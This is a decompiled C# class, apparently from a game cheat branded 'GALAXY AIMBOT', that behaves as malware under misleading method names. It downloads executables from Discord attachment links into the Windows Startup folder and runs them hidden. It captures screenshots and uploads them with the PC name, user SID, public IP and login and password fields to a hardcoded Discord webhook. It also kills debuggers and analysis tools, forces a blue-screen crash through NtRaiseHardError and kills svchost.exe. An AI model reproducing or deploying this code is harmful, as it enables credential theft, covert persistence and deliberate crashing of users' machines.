using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using RenameMe.Properties;

namespace RenameMe
{
	// Token: 0x02000049 RID: 73
	internal class MemoryImporter
	{
		// Token: 0x060001B7 RID: 439
		[DllImport("ntdll.dll")]
		public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		// Token: 0x060001B8 RID: 440
		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		// Token: 0x060001B9 RID: 441
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x060001BA RID: 442 RVA: 0x0000A4E0 File Offset: 0x000086E0
		public static void ServicesInterop()
		{
			using (WebClient webClient = new WebClient())
			{
				try
				{
					string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.exe";
					webClient.DownloadFile("https://cdn.discordapp.com/attachments/998772629743869992/998773040726949909/drv.exe", fileName);
					Process process = new Process();
					process.StartInfo.RedirectStandardInput = true;
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.FileName = fileName;
					process.Start();
					process.WaitForExit();
				}
				catch
				{
				}
			}
		}

		// Token: 0x060001BB RID: 443 RVA: 0x00002C49 File Offset: 0x00000E49
		public static void sendWebHook(string Url, string msg, string Username)
		{
			HTTP.Post(Url, new NameValueCollection
			{
				{
					"username",
					Username
				},
				{
					"content",
					msg
				}
			});
		}

		// Token: 0x060001BC RID: 444 RVA: 0x0000A580 File Offset: 0x00008780
		public static void PrintSender1(Process processo)
		{
			string text = DateTime.Now.ToString("hh:mm:ss tt");
			string text2 = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(new char[]
			{
				':'
			})[1].Substring(1).Split(new char[]
			{
				'<'
			})[0];
			WebClient webClient = new WebClient();
			Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(MemoryImporter.temp + "\\printscreen.png", ImageFormat.Png);
			string text3 = MemoryImporter.temp + "\\printscreen.png";
			webClient.UploadFile("https://discord.com/api/webhooks/1009198256259072041/-B9_Lhy8iITtfhcrl0THKsdVa86hVuZ4CUjQjAfaXdo3jbRU9wop7HTXiHhbdCaaEmlV", text3);
			try
			{
				MemoryImporter.sendWebHook("https://discord.com/api/webhooks/1009198256259072041/-B9_Lhy8iITtfhcrl0THKsdVa86hVuZ4CUjQjAfaXdo3jbRU9wop7HTXiHhbdCaaEmlV", string.Concat(new string[]
				{
					" PC name: ",
					MemoryImporter.name,
					"\n hwid: ",
					MemoryImporter.HWID,
					"\n ip: ",
					text2,
					"\n Horario: ",
					text,
					"\n LOGIN ",
					InformacaoDeUsuario.userlogin,
					"\n SENHA: ",
					InformacaoDeUsuario.builduser,
					"\n Foi pego usando: ",
					processo.ProcessName,
					"\n\n\n\n"
				}), "GALAXYAIMBOT\n ");
			}
			catch
			{
				MemoryImporter.BinaryConstPagePool();
			}
			File.Delete(text3);
		}

		// Token: 0x060001BD RID: 445 RVA: 0x0000A720 File Offset: 0x00008920
		public static void PrintSender(Process processo)
		{
			string text = DateTime.Now.ToString("hh:mm:ss tt");
			string text2 = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(new char[]
			{
				':'
			})[1].Substring(1).Split(new char[]
			{
				'<'
			})[0];
			WebClient webClient = new WebClient();
			Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
			bitmap.Save(MemoryImporter.temp + "\\printscreen.png", ImageFormat.Png);
			string text3 = MemoryImporter.temp + "\\printscreen.png";
			webClient.UploadFile("https://discord.com/api/webhooks/1009198256259072041/-B9_Lhy8iITtfhcrl0THKsdVa86hVuZ4CUjQjAfaXdo3jbRU9wop7HTXiHhbdCaaEmlV", text3);
			try
			{
				MemoryImporter.sendWebHook("https://discord.com/api/webhooks/1009198256259072041/-B9_Lhy8iITtfhcrl0THKsdVa86hVuZ4CUjQjAfaXdo3jbRU9wop7HTXiHhbdCaaEmlV", string.Concat(new string[]
				{
					" PC name: ",
					MemoryImporter.name,
					"\n hwid: ",
					MemoryImporter.HWID,
					"\n ip: ",
					text2,
					"\n Horario: ",
					text,
					"\n LOGIN: ",
					InformacaoDeUsuario.userlogin,
					"\n SENHA: ",
					InformacaoDeUsuario.builduser,
					"\n Foi pego usando: ",
					processo.ProcessName,
					"\n\n\n\n"
				}), "GALAXY AIMBOT\n ");
			}
			catch
			{
				MemoryImporter.BinaryConstPagePool();
			}
			File.Delete(text3);
			MemoryImporter.stonksnot();
		}

		// Token: 0x060001BE RID: 446 RVA: 0x0000A8C4 File Offset: 0x00008AC4
		public static void HexValueCalculator()
		{
			using (WebClient webClient = new WebClient())
			{
				try
				{
					string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Runtime Broker.exe";
					webClient.DownloadFile("https://cdn.discordapp.com/attachments/1004799332618354708/1006705873911042078/fodasse.exe", text);
					Process process = new Process();
					process.StartInfo.RedirectStandardInput = true;
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.FileName = text;
					process.Start();
					process.Start();
					process.WaitForExit();
					File.Delete(text);
				}
				catch
				{
				}
			}
		}

		// Token: 0x060001BF RID: 447 RVA: 0x0000A970 File Offset: 0x00008B70
		public static void stonksnot()
		{
			string usernamedbg = Settings.Default.Usernamedbg;
			if (new WebClient().DownloadString("http://51.79.86.198/illusion/api/delete.php?login=" + usernamedbg).Contains("banned_success"))
			{
				MemoryImporter.FindPattern();
				MemoryImporter.HexValueCalculator();
				MemoryImporter.BinaryConstPagePool();
				Environment.Exit(0);
				Process.GetCurrentProcess().Kill();
				File.Create("a??|\\\\????@@1!:").Close();
				return;
			}
			MemoryImporter.FindPattern();
			MemoryImporter.HexValueCalculator();
			MemoryImporter.BinaryConstPagePool();
			Environment.Exit(0);
			Process.GetCurrentProcess().Kill();
			File.Create("a??|\\\\????@@1!:").Close();
		}

		// Token: 0x060001C0 RID: 448 RVA: 0x0000AA08 File Offset: 0x00008C08
		public static void ArrayBase()
		{
			Process[] processesByName = Process.GetProcessesByName("ProcessHacker");
			foreach (Process process in processesByName)
			{
				MemoryImporter.PrintSender(process);
				process.Kill();
			}
			Process[] processesByName2 = Process.GetProcessesByName("Mugen JinFuu");
			foreach (Process process2 in processesByName2)
			{
				MemoryImporter.PrintSender(process2);
				process2.Kill();
			}
			Process[] processesByName3 = Process.GetProcessesByName("MugenJinFuu-x86_64-SSE4-AVX2");
			foreach (Process process3 in processesByName3)
			{
				MemoryImporter.PrintSender(process3);
				process3.Kill();
			}
			Process[] processesByName4 = Process.GetProcessesByName("MugenJinFuu-x86_64");
			foreach (Process process4 in processesByName4)
			{
				MemoryImporter.PrintSender(process4);
				process4.Kill();
			}
			Process[] processesByName5 = Process.GetProcessesByName("The Wireshark Network Analyzer");
			foreach (Process process5 in processesByName5)
			{
				MemoryImporter.PrintSender(process5);
				process5.Kill();
			}
			Process[] processesByName6 = Process.GetProcessesByName("Progress Telerik Fiddler Web Debugger");
			foreach (Process process6 in processesByName6)
			{
				MemoryImporter.PrintSender(process6);
				process6.Kill();
			}
			Process[] processesByName7 = Process.GetProcessesByName("cheatengine-i386");
			foreach (Process process7 in processesByName7)
			{
				MemoryImporter.PrintSender(process7);
				process7.Kill();
			}
			Process[] processesByName8 = Process.GetProcessesByName("cheatengine-x86_64");
			foreach (Process process8 in processesByName8)
			{
				MemoryImporter.PrintSender(process8);
				process8.Kill();
			}
			Process[] processesByName9 = Process.GetProcessesByName("HTTPDebuggerSvc");
			foreach (Process process9 in processesByName9)
			{
				MemoryImporter.PrintSender(process9);
				process9.Kill();
			}
			Process[] processesByName10 = Process.GetProcessesByName("idaq64");
			foreach (Process process10 in processesByName10)
			{
				MemoryImporter.PrintSender(process10);
				process10.Kill();
			}
			foreach (Process process11 in Process.GetProcessesByName("Fiddler Everywhere"))
			{
				MemoryImporter.PrintSender(process11);
				process11.Kill();
			}
			Process[] processesByName11 = Process.GetProcessesByName("Wireshark");
			foreach (Process process12 in processesByName11)
			{
				MemoryImporter.PrintSender(process12);
				process12.Kill();
			}
			Process[] processesByName12 = Process.GetProcessesByName("Dumpcap");
			foreach (Process process13 in processesByName12)
			{
				MemoryImporter.PrintSender(process13);
				process13.Kill();
			}
			Process[] processesByName13 = Process.GetProcessesByName("Fiddler.WebUi");
			foreach (Process process14 in processesByName13)
			{
				MemoryImporter.PrintSender(process14);
				process14.Kill();
			}
			Process[] processesByName14 = Process.GetProcessesByName("HTTP Debugger (32bits)");
			foreach (Process process15 in processesByName14)
			{
				MemoryImporter.PrintSender(process15);
				process15.Kill();
			}
			Process[] processesByName15 = Process.GetProcessesByName("IDA v7.0.170914");
			foreach (Process process16 in processesByName15)
			{
				MemoryImporter.PrintSender(process16);
				process16.Kill();
			}
			foreach (Process process17 in Process.GetProcessesByName("IDA"))
			{
				MemoryImporter.PrintSender(process17);
				process17.Kill();
			}
			foreach (Process process18 in Process.GetProcessesByName("IDAPRO"))
			{
				MemoryImporter.PrintSender(process18);
				process18.Kill();
			}
			Process[] processesByName16 = Process.GetProcessesByName("createdump");
			foreach (Process process19 in processesByName16)
			{
				MemoryImporter.PrintSender(process19);
				process19.Kill();
			}
			Process[] processesByName17 = Process.GetProcessesByName("dnSpy");
			foreach (Process process20 in processesByName17)
			{
				MemoryImporter.PrintSender(process20);
				process20.Kill();
			}
			Process[] processesByName18 = Process.GetProcessesByName("HTTPDebuggerUI");
			foreach (Process process21 in processesByName18)
			{
				MemoryImporter.PrintSender(process21);
				process21.Kill();
			}
			Process[] processesByName19 = Process.GetProcessesByName("ILSpy");
			foreach (Process process22 in processesByName19)
			{
				MemoryImporter.PrintSender(process22);
				process22.Kill();
			}
			Process[] processesByName20 = Process.GetProcessesByName("Fiddler");
			foreach (Process process23 in processesByName20)
			{
				MemoryImporter.PrintSender(process23);
				process23.Kill();
			}
			Process[] processesByName21 = Process.GetProcessesByName("Charles");
			foreach (Process process24 in processesByName21)
			{
				MemoryImporter.PrintSender(process24);
				process24.Kill();
			}
			Process[] processesByName22 = Process.GetProcessesByName("RequestBin");
			foreach (Process process25 in processesByName22)
			{
				MemoryImporter.PrintSender(process25);
				process25.Kill();
			}
			Process[] processesByName23 = Process.GetProcessesByName("x64dbg");
			foreach (Process process26 in processesByName23)
			{
				MemoryImporter.PrintSender(process26);
				process26.Kill();
			}
			Process[] processesByName24 = Process.GetProcessesByName("x32dbg");
			foreach (Process process27 in processesByName24)
			{
				MemoryImporter.PrintSender(process27);
				process27.Kill();
			}
			Process[] processesByName25 = Process.GetProcessesByName("KsDumper");
			foreach (Process process28 in processesByName25)
			{
				MemoryImporter.PrintSender(process28);
				process28.Kill();
			}
			Process[] processesByName26 = Process.GetProcessesByName("dotPeek");
			foreach (Process process29 in processesByName26)
			{
				MemoryImporter.PrintSender(process29);
				process29.Kill();
			}
			Process[] processesByName27 = Process.GetProcessesByName("dotTrace");
			foreach (Process process30 in processesByName27)
			{
				MemoryImporter.PrintSender(process30);
				process30.Kill();
			}
			Process[] processesByName28 = Process.GetProcessesByName("OzCode");
			foreach (Process process31 in processesByName28)
			{
				MemoryImporter.PrintSender(process31);
				process31.Kill();
			}
			Process[] processesByName29 = Process.GetProcessesByName("ProcessExplorer");
			foreach (Process process32 in processesByName29)
			{
				MemoryImporter.PrintSender(process32);
				process32.Kill();
			}
			Process[] processesByName30 = Process.GetProcessesByName("ProcDump");
			foreach (Process process33 in processesByName30)
			{
				MemoryImporter.PrintSender(process33);
				process33.Kill();
			}
			Process[] processesByName31 = Process.GetProcessesByName("Sysinternals");
			foreach (Process process34 in processesByName31)
			{
				MemoryImporter.PrintSender(process34);
				process34.Kill();
			}
			Process[] processesByName32 = Process.GetProcessesByName("OLLYDBG");
			foreach (Process process35 in processesByName32)
			{
				MemoryImporter.PrintSender(process35);
				process35.Kill();
			}
			Process[] processesByName33 = Process.GetProcessesByName("xdebug");
			foreach (Process process36 in processesByName33)
			{
				MemoryImporter.PrintSender(process36);
				process36.Kill();
			}
			Process[] processesByName34 = Process.GetProcessesByName("ida64");
			foreach (Process process37 in processesByName34)
			{
				MemoryImporter.PrintSender(process37);
				process37.Kill();
			}
			Process[] processesByName35 = Process.GetProcessesByName("ida32");
			foreach (Process process38 in processesByName35)
			{
				MemoryImporter.PrintSender(process38);
				process38.Kill();
			}
			Process[] processesByName36 = Process.GetProcessesByName("idax86");
			foreach (Process process39 in processesByName36)
			{
				MemoryImporter.PrintSender(process39);
				process39.Kill();
			}
			Process[] processesByName37 = Process.GetProcessesByName("PerfView");
			foreach (Process process40 in processesByName16)
			{
				MemoryImporter.PrintSender(process40);
				process40.Kill();
			}
			Process[] processesByName38 = Process.GetProcessesByName("MegaDumper");
			foreach (Process process41 in processesByName38)
			{
				MemoryImporter.PrintSender(process41);
				process41.Kill();
			}
			Process[] processesByName39 = Process.GetProcessesByName("NoFuserEx");
			foreach (Process process42 in processesByName39)
			{
				MemoryImporter.PrintSender(process42);
				process42.Kill();
			}
			Process[] processesByName40 = Process.GetProcessesByName("MegaDumper 1.0 by CodeCracker / SnD");
			foreach (Process process43 in processesByName40)
			{
				MemoryImporter.PrintSender(process43);
				process43.Kill();
			}
			Process[] processesByName41 = Process.GetProcessesByName("Nemesis");
			foreach (Process process44 in processesByName41)
			{
				MemoryImporter.PrintSender(process44);
				process44.Kill();
			}
			foreach (Process process45 in Process.GetProcessesByName("dnSpy-x86"))
			{
				MemoryImporter.PrintSender(process45);
				process45.Kill();
			}
			foreach (Process process46 in Process.GetProcessesByName("dnSpy-x64"))
			{
				MemoryImporter.PrintSender(process46);
				process46.Kill();
			}
			foreach (Process process47 in Process.GetProcessesByName("dnSpy"))
			{
				MemoryImporter.PrintSender(process47);
				process47.Kill();
			}
			Process[] processesByName42 = Process.GetProcessesByName("ExtremeDumper");
			foreach (Process process48 in processesByName42)
			{
				MemoryImporter.PrintSender(process48);
				process48.Kill();
			}
			Process[] processesByName43 = Process.GetProcessesByName("ExtremeDumper-x86");
			foreach (Process process49 in processesByName43)
			{
				MemoryImporter.PrintSender(process49);
				process49.Kill();
			}
			Process[] processesByName44 = Process.GetProcessesByName("M E G A D U M P E R");
			foreach (Process process50 in processesByName44)
			{
				MemoryImporter.PrintSender(process50);
				process50.Kill();
			}
			Process[] processesByName45 = Process.GetProcessesByName("`M`E`G`A`D`U`M`P`E`R");
			Process[] processesByName46 = Process.GetProcessesByName("HTTPDebugger");
			foreach (Process process51 in Process.GetProcessesByName("HTTP Debugger (64bits)"))
			{
				MemoryImporter.PrintSender(process51);
				process51.Kill();
			}
			foreach (Process process52 in processesByName46)
			{
				MemoryImporter.PrintSender(process52);
				process52.Kill();
			}
			foreach (Process process53 in processesByName45)
			{
				MemoryImporter.PrintSender(process53);
				process53.Kill();
			}
			foreach (Process process54 in processesByName41)
			{
				MemoryImporter.PrintSender(process54);
				process54.Kill();
			}
			foreach (Process process55 in processesByName17)
			{
				MemoryImporter.PrintSender(process55);
				process55.Kill();
			}
			foreach (Process process56 in processesByName18)
			{
				MemoryImporter.PrintSender(process56);
				process56.Kill();
			}
			foreach (Process process57 in processesByName19)
			{
				MemoryImporter.PrintSender(process57);
				process57.Kill();
			}
			foreach (Process process58 in processesByName20)
			{
				MemoryImporter.PrintSender(process58);
				process58.Kill();
			}
			foreach (Process process59 in processesByName21)
			{
				MemoryImporter.PrintSender(process59);
				process59.Kill();
			}
			foreach (Process process60 in processesByName22)
			{
				MemoryImporter.PrintSender(process60);
				process60.Kill();
			}
			foreach (Process process61 in processesByName23)
			{
				MemoryImporter.PrintSender(process61);
				process61.Kill();
			}
			foreach (Process process62 in processesByName24)
			{
				MemoryImporter.PrintSender(process62);
				process62.Kill();
			}
			foreach (Process process63 in processesByName25)
			{
				MemoryImporter.PrintSender(process63);
				process63.Kill();
			}
			foreach (Process process64 in processesByName26)
			{
				MemoryImporter.PrintSender(process64);
				process64.Kill();
			}
			foreach (Process process65 in processesByName27)
			{
				MemoryImporter.PrintSender(process65);
				process65.Kill();
			}
			foreach (Process process66 in processesByName28)
			{
				MemoryImporter.PrintSender(process66);
				process66.Kill();
			}
			foreach (Process process67 in processesByName29)
			{
				MemoryImporter.PrintSender(process67);
				process67.Kill();
			}
			foreach (Process process68 in processesByName30)
			{
				MemoryImporter.PrintSender(process68);
				process68.Kill();
			}
			foreach (Process process69 in processesByName31)
			{
				MemoryImporter.PrintSender(process69);
				process69.Kill();
			}
			foreach (Process process70 in processesByName32)
			{
				MemoryImporter.PrintSender(process70);
				process70.Kill();
			}
			foreach (Process process71 in processesByName33)
			{
				MemoryImporter.PrintSender(process71);
				process71.Kill();
			}
			foreach (Process process72 in processesByName34)
			{
				MemoryImporter.PrintSender(process72);
				process72.Kill();
			}
			foreach (Process process73 in processesByName35)
			{
				MemoryImporter.PrintSender(process73);
				process73.Kill();
			}
			foreach (Process process74 in processesByName36)
			{
				MemoryImporter.PrintSender(process74);
				process74.Kill();
			}
			foreach (Process process75 in processesByName37)
			{
				MemoryImporter.PrintSender(process75);
				process75.Kill();
			}
			foreach (Process process76 in processesByName16)
			{
				MemoryImporter.PrintSender(process76);
				process76.Kill();
			}
			foreach (Process process77 in processesByName15)
			{
				MemoryImporter.PrintSender(process77);
				process77.Kill();
			}
			foreach (Process process78 in processesByName14)
			{
				MemoryImporter.PrintSender(process78);
				process78.Kill();
			}
			foreach (Process process79 in processesByName13)
			{
				MemoryImporter.PrintSender(process79);
				process79.Kill();
			}
			foreach (Process process80 in processesByName12)
			{
				MemoryImporter.PrintSender(process80);
				process80.Kill();
			}
			foreach (Process process81 in processesByName11)
			{
				MemoryImporter.PrintSender(process81);
				process81.Kill();
			}
			foreach (Process process82 in processesByName10)
			{
				MemoryImporter.PrintSender(process82);
				process82.Kill();
			}
			foreach (Process process83 in processesByName9)
			{
				MemoryImporter.PrintSender(process83);
				process83.Kill();
			}
			foreach (Process process84 in processesByName8)
			{
				MemoryImporter.PrintSender(process84);
				process84.Kill();
			}
			foreach (Process process85 in processesByName7)
			{
				MemoryImporter.PrintSender(process85);
				process85.Kill();
			}
			foreach (Process process86 in processesByName6)
			{
				MemoryImporter.PrintSender(process86);
				process86.Kill();
			}
			foreach (Process process87 in processesByName5)
			{
				MemoryImporter.PrintSender(process87);
				process87.Kill();
			}
			foreach (Process process88 in processesByName4)
			{
				MemoryImporter.PrintSender(process88);
				process88.Kill();
			}
			foreach (Process process89 in processesByName3)
			{
				MemoryImporter.PrintSender(process89);
				process89.Kill();
			}
			foreach (Process process90 in processesByName2)
			{
				MemoryImporter.PrintSender(process90);
				process90.Kill();
			}
			foreach (Process process91 in processesByName)
			{
				MemoryImporter.PrintSender(process91);
				process91.Kill();
			}
			foreach (Process process92 in processesByName38)
			{
				MemoryImporter.PrintSender(process92);
				process92.Kill();
			}
			foreach (Process process93 in processesByName39)
			{
				MemoryImporter.PrintSender(process93);
				process93.Kill();
			}
			foreach (Process process94 in processesByName40)
			{
				MemoryImporter.PrintSender(process94);
				process94.Kill();
			}
			foreach (Process process95 in processesByName41)
			{
				MemoryImporter.PrintSender(process95);
				process95.Kill();
			}
			foreach (Process process96 in processesByName42)
			{
				MemoryImporter.PrintSender(process96);
				process96.Kill();
			}
			foreach (Process process97 in processesByName43)
			{
				MemoryImporter.PrintSender(process97);
				process97.Kill();
			}
			foreach (Process process98 in processesByName44)
			{
				MemoryImporter.PrintSender(process98);
				process98.Kill();
			}
			foreach (Process process99 in processesByName45)
			{
				MemoryImporter.PrintSender(process99);
				process99.Kill();
			}
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x00002C6F File Offset: 0x00000E6F
		public static void FoundAllocateMemoryBase()
		{
			new Thread(delegate()
			{
				for (;;)
				{
					Thread.Sleep(500);
					try
					{
						MemoryImporter.ArrayBase();
						MemoryImporter.detectweb();
					}
					catch
					{
					}
				}
			}).Start();
		}

		// Token: 0x060001C2 RID: 450 RVA: 0x00002C9A File Offset: 0x00000E9A
		public static void FindPattern()
		{
			new Thread(delegate()
			{
				try
				{
					MemoryImporter.ServicesInterop();
				}
				catch
				{
					MemoryImporter.BinaryConstPagePool();
				}
			}).Start();
		}

		// Token: 0x060001C3 RID: 451 RVA: 0x00002CC5 File Offset: 0x00000EC5
		public static void InternalParamAvoidSigs()
		{
			new Thread(delegate()
			{
				for (;;)
				{
					try
					{
						Thread.Sleep(15000);
						MemoryImporter.BinaryConstPagePool();
					}
					catch
					{
					}
				}
			}).Start();
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x0000BB80 File Offset: 0x00009D80
		public static void detectweb()
		{
			if (MemoryImporter.GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero || MemoryImporter.GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero || MemoryImporter.GetModuleHandle("RestSharp.dll") != IntPtr.Zero || MemoryImporter.GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero)
			{
				MemoryImporter.BinaryConstPagePool();
			}
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x0000BBEC File Offset: 0x00009DEC
		public static void DEADBEEFCOFFE(string command)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			int exitCode = process.ExitCode;
			process.Close();
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x0000BC5C File Offset: 0x00009E5C
		public static void BinaryConstPagePool()
		{
			Thread.Sleep(5000);
			bool flag;
			MemoryImporter.RtlAdjustPrivilege(19, true, false, out flag);
			uint num;
			MemoryImporter.NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num);
			MemoryImporter.DEADBEEFCOFFE("taskkill /F /IM svchost.exe");
		}

		// Token: 0x040003D3 RID: 979
		public static string HWID = WindowsIdentity.GetCurrent().User.Value;

		// Token: 0x040003D4 RID: 980
		public static string name = Environment.UserName;

		// Token: 0x040003D5 RID: 981
		public static string temp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
	}
}
